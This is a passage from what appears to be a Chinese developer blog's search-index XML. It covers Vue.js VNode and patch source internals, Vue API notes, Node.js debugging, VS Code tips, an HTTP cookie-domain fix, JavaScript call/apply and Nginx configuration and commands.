Component | void; // rendered in this component's scope key: string | number | void; componentOptions: VNodeComponentOptions | void; componentInstance: Component | void; // component instance parent: VNode | void; // component placeholder node // strictly internal raw: boolean; // contains raw HTML? (server only) isStatic: boolean; // hoisted static node isRootInsert: boolean; // necessary for enter transition check isComment: boolean; // empty comment placeholder? isCloned: boolean; // is a cloned node? isOnce: boolean; // is a v-once node? asyncFactory: Function | void; // async component factory function asyncMeta: Object | void; isAsyncPlaceholder: boolean; ssrContext: Object | void; fnContext: Component | void; // real context vm for functional nodes fnOptions: ?ComponentOptions; // for SSR caching devtoolsMeta: ?Object; // used to store functional render context for devtools fnScopeId: ?string; // functional scope id support constructor ( tag?: string, data?: VNodeData, children?: ?Array&lt;VNode&gt;, text?: string, elm?: Node, context?: Component, componentOptions?: VNodeComponentOptions, asyncFactory?: Function ) &#123; this.tag = tag this.data = data this.children = children this.text = text this.elm = elm this.ns = undefined this.context = context this.fnContext = undefined this.fnOptions = undefined this.fnScopeId = undefined this.key = data &amp;&amp; data.key this.componentOptions = componentOptions this.componentInstance = undefined this.parent = undefined this.raw = false this.isStatic = false this.isRootInsert = true this.isComment = false this.isCloned = false this.isOnce = false this.asyncFactory = asyncFactory this.asyncMeta = undefined this.isAsyncPlaceholder = false &#125; // DEPRECATED: alias for componentInstance for backwards compat. /* istanbul ignore next */ get child (): Component | void &#123; return this.componentInstance &#125;&#125; 可以看到 Vue.js 中的 Virtual DOM 的定义还是略微复杂一些的，因为它这里包含了很多 Vue.js 的特性。这里千万不要被这些茫茫多的属性吓到，实际上 Vue.js 中 Virtual DOM 是借鉴了一个开源库 snabbdom 的实现，然后加入了一些 Vue.js 特色的东西。 其实 VNode 是对真实 DOM 的一种抽象描述，它的核心定义无非就几个关键属性，标签名、数据、子节点、键值等，其它属性都是都是用来扩展 VNode 的灵活性以及实现一些特殊 feature 的。由于 VNode 只是用来映射到真实 DOM 的渲染，不需要包含操作 DOM 的方法，因此它是非常轻量和简单的。 Virtual DOM 除了它的数据结构的定义，映射到真实的 DOM 实际上要经历 VNode 的 create、diff、patch 等过程。那么在 Vue.js 中，VNode 的 create 是通过之前提到的 createElement 方法创建的。 updateVue 的 _update 是实例的一个私有方法，它被调用的时机有 2 个，一个是首次渲染，一个是数据更新的时候，作用是把 VNode 渲染成真实的 DOM。// src/core/instance/lifecycle.js12345678910111213141516171819202122232425262728293031323334export function lifecycleMixin (Vue: Class&lt;Component&gt;) &#123; Vue.prototype._update = function (vnode: VNode, hydrating?: boolean) &#123; const vm: Component = this const prevEl = vm.$el const prevVnode = vm._vnode const restoreActiveInstance = setActiveInstance(vm) vm._vnode = vnode // Vue.prototype.__patch__ is injected in entry points // based on the rendering backend used. if (!prevVnode) &#123; // initial render vm.$el = vm.__patch__(vm.$el, vnode, hydrating, false /* removeOnly */) &#125; else &#123; // updates vm.$el = vm.__patch__(prevVnode, vnode) &#125; restoreActiveInstance() // update __vue__ reference if (prevEl) &#123; prevEl.__vue__ = null &#125; if (vm.$el) &#123; vm.$el.__vue__ = vm &#125; // if parent is an HOC, update its $el as well if (vm.$vnode &amp;&amp; vm.$parent &amp;&amp; vm.$vnode === vm.$parent._vnode) &#123; vm.$parent.$el = vm.$el &#125; // updated hook is called by the scheduler to ensure that children are // updated in a parent's updated hook. &#125; // ...&#125; _update 的核心就是调用 vm.patch 方法，这个方法实际上在不同的平台，比如 web 和 weex 上的定义是不一样的，因此在 web 平台中它的定义在// src/platforms/web/runtime/index.js 中：1Vue.prototype.__patch__ = inBrowser ? patch : noop 可以看到，甚至在 web 平台上，是否是服务端渲染也会对这个方法产生影响。因为在服务端渲染中，没有真实的浏览器 DOM 环境，所以不需要把 VNode 最终转换成 DOM，因此是一个空函数，而在浏览器端渲染中，它指向了 patch 方法，它的定义在// src/platforms/web/runtime/patch.js1export const patch: Function = createPatchFunction(&#123; nodeOps, modules &#125;) 该方法的定义是调用 createPatchFunction 方法的返回值，这里传入了一个对象，包含 nodeOps 参数和 modules 参数。其中，nodeOps 封装了一系列 DOM 操作的方法，modules 定义了一些模块的钩子函数的实现。 createPatchFunction 内部定义了一系列的辅助方法，最终返回了一个 patch 方法，这个方法就赋值给了 vm._update 函数里调用的 vm.patch。// src/core/vdom/patch.js12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182const hooks = ['create', 'activate', 'update', 'remove', 'destroy']export function createPatchFunction (backend) &#123; let i, j const cbs = &#123;&#125; const &#123; modules, nodeOps &#125; = backend for (i = 0; i &lt; hooks.length; ++i) &#123; cbs[hooks[i]] = [] for (j = 0; j &lt; modules.length; ++j) &#123; if (isDef(modules[j][hooks[i]])) &#123; cbs[hooks[i]].push(modules[j][hooks[i]]) &#125; &#125; &#125; let creatingElmInVPre = 0 function createElm (vnode, insertedVnodeQueue, parentElm, refElm, nested, ownerArray, index) &#123; if (isDef(vnode.elm) &amp;&amp; isDef(ownerArray)) &#123; // This vnode was used in a previous render! // now it's used as a new node, overwriting its elm would cause // potential patch errors down the road when it's used as an insertion // reference node. Instead, we clone the node on-demand before creating // associated DOM element for it. vnode = ownerArray[index] = cloneVNode(vnode) &#125; vnode.isRootInsert = !nested // for transition enter check if (createComponent(vnode, insertedVnodeQueue, parentElm, refElm)) &#123; return &#125; const data = vnode.data const children = vnode.children const tag = vnode.tag if (isDef(tag)) &#123; if (process.env.NODE_ENV !== 'production') &#123; if (data &amp;&amp; data.pre) &#123; creatingElmInVPre++ &#125; if (isUnknownElement(vnode, creatingElmInVPre)) &#123; warn( 'Unknown custom element: &lt;' + tag + '&gt; - did you ' + 'register the component correctly? For recursive components, ' + 'make sure to provide the "name" option.', vnode.context ) &#125; &#125; vnode.elm = vnode.ns ? nodeOps.createElementNS(vnode.ns, tag) : nodeOps.createElement(tag, vnode) setScope(vnode) /* istanbul ignore if */ if (__WEEX__) &#123; // ... &#125; else &#123; createChildren(vnode, children, insertedVnodeQueue) if (isDef(data)) &#123; invokeCreateHooks(vnode, insertedVnodeQueue) &#125; insert(parentElm, vnode.elm, refElm) &#125; if (process.env.NODE_ENV !== 'production' &amp;&amp; data &amp;&amp; data.pre) &#123; creatingElmInVPre-- &#125; &#125; else if (isTrue(vnode.isComment)) &#123; vnode.elm = nodeOps.createComment(vnode.text) insert(parentElm, vnode.elm, refElm) &#125; else &#123; vnode.elm = nodeOps.createTextNode(vnode.text) insert(parentElm, vnode.elm, refElm) &#125; &#125; // ...&#125; 由于我们传入的 oldVnode 实际上是一个 DOM container，所以 isRealElement 为 true，接下来又通过 emptyNodeAt 方法把 oldVnode 转换成 VNode 对象，然后再调用 createElm 方法，这个方法在这里非常重要。 createElm 的作用是通过虚拟节点创建真实的 DOM 并插入到它的父节点中。 我们来看一下它的一些关键逻辑，createComponent 方法目的是尝试创建子组件，在当前这个 case 下它的返回值为 false；接下来判断 vnode 是否包含 tag，如果包含，先简单对 tag 的合法性在非生产环境下做校验，看是否是一个合法标签；然后再去调用平台 DOM 的操作去创建一个占位符元素。 接下来调用 createChildren 方法去创建子元素，createChildren 的逻辑很简单，实际上是遍历子虚拟节点，递归调用 createElm，这是一种常用的深度优先的遍历算法，这里要注意的一点是在遍历过程中会把 vnode.elm 作为父容器的 DOM 节点占位符传入。 接着再调用 invokeCreateHooks 方法执行所有的 create 的钩子并把 vnode push 到 insertedVnodeQueue 中。 最后调用 insert 方法把 DOM 插入到父节点中，因为是递归调用，子元素会优先调用 insert，所以整个 vnode 树节点的插入顺序是先子后父。// src/core/vdom/patch.js1234567891011function insert (parent, elm, ref) &#123; if (isDef(parent)) &#123; if (isDef(ref)) &#123; if (nodeOps.parentNode(ref) === parent) &#123; nodeOps.insertBefore(parent, elm, ref) &#125; &#125; else &#123; nodeOps.appendChild(parent, elm) &#125; &#125;&#125; insert 方法逻辑很简单，调用一些 nodeOps 把子节点插入到父节点中，其实就是调用原生 DOM 的 API 进行 DOM 操作，看到这里，很多同学恍然大悟，原来 Vue 是这样动态创建的 DOM。// src/platforms/web/runtime/node-ops.js1234567export function insertBefore (parentNode: Node, newNode: Node, referenceNode: Node) &#123; parentNode.insertBefore(newNode, referenceNode)&#125;export function appendChild (node: Node, child: Node) &#123; node.appendChild(child)&#125; 在 createElm 过程中，如果 vnode 节点不包含 tag，则它有可能是一个注释或者纯文本节点，可以直接插入到父元素中。在我们这个例子中，最内层就是一个文本 vnode，它的 text 值取的就是之前的 this.message 的值 Hello Vue!。 再回到 patch 方法，首次渲染我们调用了 createElm 方法，这里传入的 parentElm 是 oldVnode.elm 的父元素，在我们的例子是 id 为 #app div 的父元素，也就是 Body；实际上整个过程就是递归创建了一个完整的 DOM 树并插入到 Body 上。 最后，我们根据之前递归 createElm 生成的 vnode 插入顺序队列，执行相关的 insert 钩子函数。 那么至此我们从主线上把模板和数据如何渲染成最终的 DOM 的过程分析完毕了，以下是从初始化 Vue 到最终渲染的整个过程。new Vue –&gt; init –&gt; $mount –&gt; compile –&gt; render –&gt; vnode –&gt; patch –&gt; DOM 组件化Vue.js 另一个核心思想是组件化。所谓组件化，就是把页面拆分成多个组件 (component)，每个组件依赖的 CSS、JavaScript、模板、图片等资源放在一起开发和维护。组件是资源独立的，组件在系统内部可复用，组件和组件之间可以嵌套。 createComponent在分析 createElement 的实现的时候，它最终会调用 _createElement 方法，如果 tag 是一个普通的 html 标签，像上一章的例子那样是一个普通的 div，则会实例化一个普通 VNode 节点，否则通过 createComponent 方法创建一个组件 VNode。// src/core/vdom/create-component.js1234567891011121314151617181920212223242526272829303132export function createComponent ( Ctor: Class&lt;Component&gt; | Function | Object | void, data: ?VNodeData, context: Component, children: ?Array&lt;VNode&gt;, tag?: string): VNode | Array&lt;VNode&gt; | void &#123; if (isUndef(Ctor)) &#123; return &#125; const baseCtor = context.$options._base // plain options object: turn it into a constructor if (isObject(Ctor)) &#123; Ctor = baseCtor.extend(Ctor) &#125; // install component management hooks onto the placeholder node installComponentHooks(data) // return a placeholder vnode const name = Ctor.options.name || tag const vnode = new VNode( `vue-component-$&#123;Ctor.cid&#125;$&#123;name ? `-$&#123;name&#125;` : ''&#125;`, data, undefined, undefined, undefined, context, &#123; Ctor, propsData, listeners, tag, children &#125;, asyncFactory ) return vnode&#125; createComponent 的逻辑也会有一些复杂，但主要就 3 个关键步骤：构造子类构造函数，安装组件钩子函数和实例化 vnode。 在了解了 baseCtor 指向了 Vue 之后,来看一下 Vue.extend 函数的定义// src/core/global-api/extend.js1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162Vue.extend = function (extendOptions: Object): Function &#123; extendOptions = extendOptions || &#123;&#125; const Super = this const SuperId = Super.cid const cachedCtors = extendOptions._Ctor || (extendOptions._Ctor = &#123;&#125;) if (cachedCtors[SuperId]) &#123; return cachedCtors[SuperId] &#125; const name = extendOptions.name || Super.options.name if (process.env.NODE_ENV !== 'production' &amp;&amp; name) &#123; validateComponentName(name) &#125; const Sub = function VueComponent (options) &#123; this._init(options) &#125; Sub.prototype = Object.create(Super.prototype) Sub.prototype.constructor = Sub Sub.cid = cid++ Sub.options = mergeOptions( Super.options, extendOptions ) Sub['super'] = Super // For props and computed properties, we define the proxy getters on // the Vue instances at extension time, on the extended prototype. This // avoids Object.defineProperty calls for each instance created. if (Sub.options.props) &#123; initProps(Sub) &#125; if (Sub.options.computed) &#123; initComputed(Sub) &#125; // allow further extension/mixin/plugin usage Sub.extend = Super.extend Sub.mixin = Super.mixin Sub.use = Super.use // create asset registers, so extended classes // can have their private assets too. ASSET_TYPES.forEach(function (type) &#123; Sub[type] = Super[type] &#125;) // enable recursive self-lookup if (name) &#123; Sub.options.components[name] = Sub &#125; // keep a reference to the super options at extension time. // later at instantiation we can check if Super's options have // been updated. Sub.superOptions = Super.options Sub.extendOptions = extendOptions Sub.sealedOptions = extend(&#123;&#125;, Sub.options) // cache constructor cachedCtors[SuperId] = Sub return Sub&#125; Vue.extend 的作用就是构造一个 Vue 的子类，它使用一种非常经典的原型继承的方式把一个纯对象转换一个继承于 Vue 的构造器 Sub 并返回，然后对 Sub 这个对象本身扩展了一些属性，如扩展 options、添加全局 API 等；并且对配置中的 props 和 computed 做了初始化工作；最后对于这个 Sub 构造函数做了缓存，避免多次执行 Vue.extend 的时候对同一个子组件重复构造。 这样当我们去实例化 Sub 的时候，就会执行 this._init 逻辑再次走到了 Vue 实例的初始化逻辑。 安装组件钩子函数。整个 installComponentHooks 的过程就是把 componentVNodeHooks 的钩子函数合并到 data.hook 中，在 VNode 执行 patch 的过程中执行相关的钩子函数，具体的执行我们稍后在介绍 patch 过程中会详细介绍。这里要注意的是合并策略，在合并过程中，如果某个时机的钩子已经存在 data.hook 中，那么通过执行 mergeHook 函数做合并，这个逻辑很简单，就是在最终执行的时候，依次执行这两个钩子函数即可。 实例化 VNode。最后一步非常简单，通过 new VNode 实例化一个 vnode 并返回。需要注意的是和普通元素节点的 vnode 不同，组件的 vnode 是没有 children 的，这点很关键。]]></content>
      <categories>
        <category>Vue</category>
      </categories>
      <tags>
        <tag>Vue</tag>
        <tag>高级</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[NodeJs调试]]></title>
    <url>%2F2019%2F02%2F17%2FNode%2FNodeJs%E8%B0%83%E8%AF%95%2F</url>
    <content type="text"><![CDATA[Inspect优势：可查看上下文变量、观察当前函数调用堆栈、无入侵代码、可暂停执行指定代码构成及原理：websockets服务监听命令、inspector协议、http服务元信息执行 node –inspect index.js控制台打印出 Debugger listening on ws://127.0.0.1:9229/ac0fc93c-40c7-45df-bff4-21048c1b7483 Chrome DevTools访问 chrome://inspect，点击配置按钮，确保Host和Post对应。一般为localhost:9229访问元信息中的 devtoolsFrontendUrl, http://127.0.0.1:9229/json点击浏览器控制台Node.js的DevTools绿色小图标 Vscode启动 fn + F5快捷键 开始调试配置launch.json开启debug模式打开自动附加模式Debug: toggole auto attach，然后命令行输入 node –inspect index.js 激活inspect]]></content>
      <categories>
        <category>Node</category>
      </categories>
      <tags>
        <tag>Node</tag>
        <tag>debug</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[vscode常用快捷键和技巧]]></title>
    <url>%2F2019%2F02%2F16%2FTools%2Fvscode%E5%B8%B8%E7%94%A8%E5%BF%AB%E6%8D%B7%E9%94%AE%E5%92%8C%E6%8A%80%E5%B7%A7%2F</url>
    <content type="text"><![CDATA[命令行里启动vscode在mac系统中，利用软连接命令ln -s，给可执行文件创造一个替身。在bin下面建立一个软连接。12cd /usr/local/bin/ln -s &quot;/Applications/Visual Studio Code.app/Contents/MacOS/Electron&quot; vscode 即可通过 vscode /Users/sea/Desktop/OnGoing/HelloWorld/FullStack/Hexo 启动vscode，并打开Hexo目录。 常用快捷键打开命令面板 Ctrl+Shift+P跳转到行 Ctrl+G]]></content>
      <categories>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>Tools</tag>
        <tag>vscode</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Http常见问题]]></title>
    <url>%2F2019%2F02%2F13%2FHttp%2FHttp%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%2F</url>
    <content type="text"><![CDATA[Response中set-cookie里的值不能写入浏览器cookie原因是因为响应头中的 cookie 是带有 domain 属性的（domain=.test.com），而从 Request URL 中可以看到，我们发起请求的域名是 localhost，请求和响应的 domain 不匹配，浏览器就帮你自动忽略了。修改服务器的配置，把响应中的 domain 去掉, cookie 就写进去了。]]></content>
      <categories>
        <category>Http</category>
      </categories>
      <tags>
        <tag>Http</tag>
        <tag>常见问题</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[vue API]]></title>
    <url>%2F2019%2F02%2F12%2FVue%2Fvue%20API%2F</url>
    <content type="text"><![CDATA[全局配置Vue.config 是一个对象，包含 Vue 的全局配置。silent： Vue.config.silent = true，取消 Vue 所有的日志与警告。devtools：Vue.config.devtools = true，配置是否允许 vue-devtools 检查代码。开发版本默认为 true，生产版本默认为 false。生产版本设为 true 可以启用检查。productionTip：设置为 false 以阻止 vue 在启动时生成生产提示。errorHandler：Vue.config.errorHandler = function (err, vm, info) {}，指定组件的渲染和观察期间未捕获错误的处理函数。warnHandler：Vue.config.warnHandler = function (msg, vm, trace) {}，为 Vue 的运行时警告赋予一个自定义处理函数。只在开发者环境下生效。ignoredElements：Vue.config.ignoredElements = [‘my-custom-web-component’,/^ion-/]，忽略在 Vue 之外的自定义元素keyCodes：Vue.config.keyCodes = {f1: 112,”media-play-pause”: 179,up: [38, 87]}，给 v-on 自定义键位别名。 camelCase 不可用,使用kebab-case 且用双引号括起来performance: 在浏览器开发工具的性能/时间线面板中启用对组件初始化、编译、渲染和打补丁的性能追踪。只适用于开发模式和支持 performance.mark API 的浏览器上。 全局 API Vue.extend( options )使用基础 Vue 构造器，创建一个“子类”。参数是一个包含组件选项的对象。data 选项是特例，需要注意 - 在 Vue.extend() 中它必须是函数 1234567891011// 创建构造器var Profile = Vue.extend(&#123; template: '&lt;p&gt;&#123;&#123;alias&#125;&#125;&lt;/p&gt;', data: function () &#123; return &#123; alias: 'Heisenberg' &#125; &#125;&#125;)// 创建 Profile 实例，并挂载到一个元素上。new Profile().$mount('#mount-point') Vue.nextTick( [callback, context] )在下次 DOM 更新循环结束之后执行延迟回调。在修改数据之后立即使用这个方法，获取更新后的 DOM。 Vue.set( target, key, value )向响应式对象中添加一个属性，并确保这个新属性同样是响应式的，且触发视图更新。它必须用于向响应式对象上添加新属性，因为 Vue 无法探测普通的新增属性 (比如 this.myObject.newProperty = ‘hi’)。注意对象不能是 Vue 实例，或者 Vue 实例的根数据对象。 Vue.delete( target, key )删除对象的属性。如果对象是响应式的，确保删除能触发更新视图。这个方法主要用于避开 Vue 不能检测到属性被删除的限制，但是你应该很少会使用它。目标对象不能是一个 Vue 实例或 Vue 实例的根数据对象。 Vue.directive( id, [definition] )注册或获取全局指令。 Vue.filter( id, [definition] )注册或获取全局过滤器。 Vue.component( id, [definition] )注册或获取全局组件。注册还会自动使用给定的id设置组件的名称 Vue.use( plugin )安装 Vue.js 插件。如果插件是一个对象，必须提供 install 方法。如果插件是一个函数，它会被作为 install 方法。install 方法调用时，会将 Vue 作为参数传入。该方法需要在调用 new Vue() 之前被调用。当 install 方法被同一个插件多次调用，插件将只会被安装一次。 Vue.mixin( mixin )全局注册一个混入，影响注册之后所有创建的每个 Vue 实例。插件作者可以使用混入，向组件注入自定义的行为。不推荐在应用代码中使用。 Vue.compile( template )在 render 函数中编译模板字符串。只在独立构建时有效 Vue.version提供字符串形式的 Vue 安装版本号。这对社区的插件和组件来说非常有用，你可以根据不同的版本号采取不同的策略。var version = Number(Vue.version.split(‘.’)[0]) 选项 / 数据 dataVue 实例的数据对象。Vue 将会递归将 data 的属性转换为 getter/setter，从而让 data 的属性能够响应数据变化。对象必须是纯粹的对象 (含有零个或多个的 key/value 对)：浏览器 API 创建的原生对象，原型上的属性会被忽略。大概来说，data 应该只能是数据 - 不推荐观察拥有状态行为的对象。以 _ 或 $ 开头的属性 不会 被 Vue 实例代理，因为它们可能和 Vue 内置的属性、API 方法冲突。你可以使用例如 vm.$data._property 的方式访问这些属性。当一个组件被定义，data 必须声明为返回一个初始数据对象的函数。否则所有的实例将共享引用同一个数据对象。 methodsmethods 将被混入到 Vue 实例中。可以直接通过 VM 实例访问这些方法，或者在指令表达式中使用。方法中的 this 自动绑定为 Vue 实例。 注意，不应该使用箭头函数来定义 method 函数 (例如 plus: () =&gt; this.a++)。理由是箭头函数绑定了父级作用域的上下文，所以 this 将不会按照期望指向 Vue 实例，this.a 将是 undefined。 选项 / 生命周期钩子所有的生命周期钩子自动绑定 this 上下文到实例中，因此你可以访问数据，对属性和方法进行运算。这意味着你不能使用箭头函数来定义一个生命周期方法 (例如 created: () =&gt; this.fetchTodos())。这是因为箭头函数绑定了父上下文，因此 this 与你期待的 Vue 实例不同，this.fetchTodos 的行为未定义。 实例方法 / 生命周期 vm.$mount( [elementOrSelector] )如果 Vue 实例在实例化时没有收到 el 选项，则它处于“未挂载”状态，没有关联的 DOM 元素。可以使用 vm.$mount() 手动地挂载一个未挂载的实例。如果没有提供 elementOrSelector 参数，模板将被渲染为文档之外的的元素，并且你必须使用原生 DOM API 把它插入文档中。这个方法返回实例自身，因而可以链式调用其它实例方法。 12345678910111213var MyComponent = Vue.extend(&#123; template: '&lt;div&gt;Hello!&lt;/div&gt;'&#125;)// 创建并挂载到 #app (会替换 #app)new MyComponent().$mount('#app')// 同上new MyComponent(&#123; el: '#app' &#125;)// 或者，在文档之外渲染并且随后挂载var component = new MyComponent().$mount()document.getElementById('app').appendChild(component.$el) vm.$nextTick( [callback] )将回调延迟到下次 DOM 更新循环之后执行。在修改数据之后立即使用它，然后等待 DOM 更新。它跟全局方法 Vue.nextTick 一样，不同的是回调的 this 自动绑定到调用它的实例上。 如果没有提供回调且在支持 Promise 的环境中，则返回一个 Promise。请注意 Vue 不自带 Promise 的 polyfill，所以如果你的目标浏览器不是原生支持 Promise，你得自行 polyfill。 vm.$destroy()完全销毁一个实例。清理它与其它实例的连接，解绑它的全部指令及事件监听器。触发 beforeDestroy 和 destroyed 的钩子。在大多数场景中你不应该调用这个方法。最好使用 v-if 和 v-for 指令以数据驱动的方式控制子组件的生命周期。 指令 v-html更新元素的 innerHTML 。注意：内容按普通 HTML 插入 - 不会作为 Vue 模板进行编译 。如果试图使用 v-html 组合模板，可以重新考虑是否通过使用组件来替代。在网站上动态渲染任意 HTML 是非常危险的，因为容易导致 XSS 攻击。只在可信内容上使用 v-html，永不用在用户提交的内容上。在单文件组件里，scoped 的样式不会应用在 v-html 内部，因为那部分 HTML 没有被 Vue 的模板编译器处理。如果你希望针对 v-html 的内容设置带作用域的 CSS，你可以替换为 CSS Modules 或用一个额外的全局 style 元素手动设置类似 BEM 的作用域策略。 v-pre跳过这个元素和它的子元素的编译过程。可以用来显示原始 Mustache 标签。跳过大量没有指令的节点会加快编译。 v-cloak这个指令保持在元素上直到关联实例结束编译。和 CSS 规则一起用时，这个指令可以隐藏未编译的 Mustache 标签直到实例准备完毕。 1[v-cloak] &#123; display: none &#125; 内置的组件 component渲染一个“元组件”为动态组件。依 is 的值，来决定哪个组件被渲染。 12345&lt;!-- 动态组件由 vm 实例的属性值 `componentId` 控制 --&gt;&lt;component :is="componentId"&gt;&lt;/component&gt;&lt;!-- 也能够渲染注册过的组件或 prop 传入的组件 --&gt;&lt;component :is="$options.components.child"&gt;&lt;/component&gt; transition-grouptransition-group 元素作为多个元素/组件的过渡效果。 渲染一个真实的 DOM 元素。默认渲染 span，可以通过 tag 属性配置哪个元素应该被渲染。注意，每个 transition-group 的子节点必须有 独立的 key ，动画才能正常工作 12345&lt;transition-group tag="ul" name="slide"&gt; &lt;li v-for="item in items" :key="item.id"&gt; &#123;&#123; item.text &#125;&#125; &lt;/li&gt;&lt;/transition-group&gt; keep-alive主要用于保留组件状态或避免重新渲染。用在其一个直属的子组件被开关的情形。如果你在其中有 v-for 则不会工作。如果有上述的多个条件性的子元素，keep-alive要求同时只有一个子元素被渲染。不会在函数式组件中正常工作，因为它们没有缓存实例。 1234&lt;!-- 正则表达式 (使用 `v-bind`) --&gt;&lt;keep-alive :include="/a|b/"&gt; &lt;component :is="view"&gt;&lt;/component&gt;&lt;/keep-alive&gt;]]></content>
      <categories>
        <category>Vue</category>
        <category>基础</category>
      </categories>
      <tags>
        <tag>Vue</tag>
        <tag>基础</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[call、apply]]></title>
    <url>%2F2019%2F02%2F09%2FJS%2Fcall%E3%80%81apply%2F</url>
    <content type="text"><![CDATA[一般来说，this总是指向调用某个方法的对象，但是使用call()和apply()方法时，可以用来重新定义函数的执行环境，就会改变函数体内this的指向。即call()和apply() 就是用来让括号里的对象来集成括号外的函数的属性！可以称之为继承！ func.call(thisObj, arg1, arg2, …)thisObj，在fun函数运行时指定的this值。需要注意的是，指定的this值并不一定是该函数执行时真正的this值，如果这个函数处于non-strict mode，则指定为null和undefined的this值会自动指向全局对象(浏览器中就是window对象)，同时值为原始值(数字，字符串，布尔值)的this会指向该原始值的自动包装对象。 返回值：使用调用者提供的this值和参数调用该函数的返回值。若该方法没有返回值，则返回undefined。 func.apply(thisObj, [argsArray])接收两个参数，一个是函数运行的作用域（this），另一个是参数数组。thisObj，可选的。在 func 函数运行时使用的 this 值。请注意，this可能不是该方法看到的实际值：如果这个函数处于非严格模式下，则指定为 null 或 undefined 时会自动替换为指向全局对象，原始值会被包装。 argsArray,可选的。一个数组或者类数组对象，其中的数组元素将作为单独的参数传给 func 函数。如果该参数的值为 null 或 undefined，则表示不需要传入任何参数。从ECMAScript 5 开始可以使用类数组对象。 123456789function add(a,b) &#123; alert(a+b); &#125; function sub(a,b) &#123; alert(a-b); &#125; add.call(sub,1,1); // 2 Array.apply() 创建数组Array.apply(null, {length: 4}): [undefined, undefined, undefined, undefined] // 初始化全为undefinedArray.apply(null, {0:’a’, 1: ‘b’, 2: ‘c’, 3: ‘d’, length:5})) // 赋值 [“a”, “b”, “c”, “d”, “e”]Array(4): [empty × 4] // 只占位 Array.prototype.slice.call() 能将具有length属性的对象转成数组， 和Array.from()相同将函数的实际参数转换成数组的方法：let arrayLike = { ‘0’: ‘a’, ‘1’: ‘b’, ‘2’: ‘c’, length: 3} let args1 = Array.prototype.slice.call(arguments)let args2 = [].slice.call(arrayLike)let args3 = Array.from(arrayLike) function example( arg1, arg2, arg3 ) { return Array.prototype.slice.call(arguments, 1); // Returns [arg2, arg3]} [].push.apply(_args, [].slice.call(arguments));1234567891011121314151617181920212223// 柯里化(Currying)'use strict';function plus(num) &#123; var adder = function () &#123; var _args = []; var _adder = function _adder() &#123; [].push.apply(_args, [].slice.call(arguments)); return _adder; &#125;; _adder.toString = function () &#123; return _args.reduce(function (a, b) &#123; return a + b; &#125;); &#125; return _adder; &#125; return adder()(num);&#125;module.exports = plus;]]></content>
      <categories>
        <category>JS</category>
      </categories>
      <tags>
        <tag>JS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Nginx]]></title>
    <url>%2F2019%2F01%2F27%2FCS%2FNginx%2F</url>
    <content type="text"><![CDATA[Nginx是一款轻量级的HTTP服务器，采用事件驱动的异步非阻塞处理方式框架，这让其具有极好的IO性能，时常用于服务端的反向代理和负载均衡。 优点 支持海量高并发：采用IO多路复用epoll。官方测试Nginx能够支持5万并发链接，实际生产环境中可以支撑2-4万并发连接数。 内存消耗少：在主流的服务器中Nginx目前是内存消耗最小的了，比如我们用Nginx+PHP，在3万并发链接下，开启10个Nginx进程消耗150M内存。 免费使用可以商业化：Nginx为开源软件，采用的是2-clause BSD-like协议，可以免费使用，并且可以用于商业。 配置文件简单：网络和程序配置通俗易懂，即使非专业运维也能看懂。 反向代理，负载均衡。正向代理代理的对象是客户端，反向代理代理的对象是服务端。 此外，web缓存加速，清除指定url缓存，健康检查，后端服务器故障转移， rewrite重写， 易用。 组成 Nginx由内核和模块组成，其中，内核的设计非常微小和简洁，完成的工作也非常简单，仅仅通过查找配置文件将客户端请求映射到一个location block（location是Nginx配置中的一个指令，用于URL匹配），而在这个location中所配置的每个指令将会启动不同的模块去完成相应的工作。 Nginx的模块从结构上分为核心模块、基础模块和第三方模块： 核心模块：HTTP模块、EVENT模块和MAIL模块 基础模块：HTTP Access模块、HTTP FastCGI模块、HTTP Proxy模块和HTTP Rewrite模块， 第三方模块：HTTP Upstream Request Hash模块、Notice模块和HTTP Access Key模块。 Nginx的模块从功能上分为如下三类。 Handlers（处理器模块）。此类模块直接处理请求，并进行输出内容和修改headers信息等操作。Handlers处理器模块一般只能有一个。 Filters （过滤器模块）。此类模块主要对其他处理器模块输出的内容进行修改操作，最后由Nginx输出。 Proxies （代理类模块）。此类模块是Nginx的HTTP Upstream之类的模块，这些模块主要与后端一些服务比如FastCGI等进行交互，实现服务代理和负载均衡等功能。 常用命令/usr/local/nginx/html 默认目录 nginx -v 查看版本 nginx- V 查看完整配置信息 ps -ef | grep nginx 查看nginx进程 nginx 启动 nginx -s reload 重新加载配置文件 nginx -s quit 优雅关闭, 会在处理完当前正在的请求后退出 nginx -s stop 直接关闭 nginx pkill -9 nginx 强制停止nginx nginx -t 检查修改 location配置 指令格式为：location [ = | ~ | ~* | ^~ ] uri {…} “=” 严格匹配 “~” 区分大小写 “~*” 不区分大小写 “^*” 匹配度最高的location匹配 其他命令 netstat -tnl # 查看网络状态tcp number listen tail -fn 10 filename # 查看最后10行内容 （cat m1 m2 &gt; file 将文件ml和m2合并后放入文件file中, less, more每次显示一屏, head, tail开头/结尾若干行， touch创建) :%s/gamma/xxx/g # vim 中将所有gamma替换为xxx grep -v “#” nginx.conf | grep -v “^$” &gt;&gt; nginx1.conf 把注释追加到nginx1.conf du -ah filename # 查看目录及子目录文件大小 （s 不包含子目录文件，h 人类可读） wc -l filename # 统计文件行数Word Count （l行数， c字节数， m字符数， w字数, L最长行长度） awk ‘{print $1, $2}’ # 文本分析处理, 每行按空格或TAB分割，输出文本中的1、2项 nginx的upstream目前支持4种方式的分配： 1、轮询（默认），每个请求按时间顺序逐一分配到不同的后端服务器，如果后端服务器down掉，能自动剔除。weight指定轮询几率，weight和访问比率成正比 2、ip_hash，每个请求按访问ip的hash结果分配，这样每个访客固定访问一个后端服务器，可以解决session的问题。 3、fair（第三方），按后端服务器的响应时间来分配请求，响应时间短的优先分配。 4、url_hash（第三方），按访问url的hash结果来分配请求，使每个url定向到同一个后端服务器，后端服务器为缓存时比较有效。 配置文件结构events 和 http 的指令是放在主上下文中，server 放在 http 中, location 放在 server 中。 